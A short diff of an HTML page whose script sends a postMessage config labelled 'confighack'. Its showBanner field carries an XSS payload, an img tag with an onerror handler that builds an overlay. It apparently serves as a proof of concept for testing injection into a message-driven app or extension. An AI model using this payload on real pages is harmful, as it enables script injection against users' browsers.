@@ -11,12 +11,10 @@
   <p></p>
 
   <script>
-    setTimeout(() => {
+    {
       window.postMessage({
-        type: "SET_CONFIG",
+        type: "confighack",
         config: {
-          targetLanguage: "en",
-          fontSize: "medium",
           showBanner: `
           <img src="x" onerror="
             const overlay = document.createElement('div');
@@ -33,7 +31,7 @@
         `
         }
       }, "*");
-    }, 500);
+    };
   </script>
 </body>
 
